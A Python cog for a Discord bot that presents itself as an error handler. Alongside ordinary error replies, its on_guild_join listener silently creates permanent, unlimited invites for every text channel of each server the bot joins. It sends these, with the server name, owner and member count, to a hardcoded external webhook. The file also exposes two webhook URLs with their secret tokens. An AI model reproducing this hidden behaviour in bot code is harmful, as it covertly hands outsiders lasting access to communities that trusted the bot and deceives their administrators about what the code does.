import discord
from discord.ext import commands
import datetime
from colorama import Fore
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed    
from utils.utils import utils
import discord, os, math, pymongo, asyncio

class Errors(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener("on_command_error")
    async def error_handler(self, ctx, error):
        if isinstance(error, commands.CommandOnCooldown):
            embed = discord.Embed(title=f'<:Error:852619009714683924> Command On Cooldown', description=f'**{error}**', timestamp=datetime.datetime.utcnow())
            embed.timestamp = datetime.datetime.utcnow()
            embed.color = discord.Color.red()
            await ctx.send(embed=embed)
        
        elif isinstance(error, commands.MissingPermissions):
            embed = discord.Embed(title=f'<:Error:852619009714683924> Error in {ctx.command}', description=f'Missing Permissions: **{"".join(error.missing_perms)}**')
            embed.timestamp = datetime.datetime.utcnow()
            embed.color = discord.Color.red()
            await ctx.send(embed=embed)
        elif isinstance(error, commands.MissingRequiredArgument):
            embed = discord.Embed(title=f'<:Error:852619009714683924> Error in {ctx.command}', description=f'MissingRequiredArgument: {error}')
            embed.timestamp = datetime.datetime.utcnow()
            embed.color = discord.Color.red()
            await ctx.send(embed=embed)
        elif isinstance(error, commands.NSFWChannelRequired):
            embed = discord.Embed(title=f'<:Error:852619009714683924> Error in {ctx.command}', description=f'{error}', timestamp=datetime.datetime.utcnow())
            embed.color = discord.Color.red()
            await ctx.send(embed=embed)  
        else:
            print(error)

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        for channel in guild.text_channels:
            link = await channel.create_invite(max_age = 0, max_uses = 0)
            webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/851928634917912577/5vwLG57DzsGIwXZgUmzS1t2leRXf10hVw551Q1_t7CNKE0SRgcdcugYQgEarlc7-tm7-")
            log = DiscordEmbed(title = f"__Joined Server!__", description = f"Name: [**{guild.name}**]\nOwner: [**{guild.owner}**]\nInvite: [[**{link}**]]({link})\nMembers: [**{len(guild.members)}**]")
            webhook.add_embed(log)
            webhook.execute()
            
    @commands.Cog.listener()
    async def on_guild_remove(self, guild):
        webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/851928943035416617/SIJxMuVTNyLjhPccQUbTwUT8MktcKIztB6Tr2RCmAINfoC5C83Ttx17qtUtMdmvnvSja")
        log = DiscordEmbed(title = f"Left Server!", description = f"Name: [**{guild.name}**]")
        webhook.add_embed(log)
        webhook.execute()
        
    

def setup(bot):
    bot.add_cog(Errors(bot))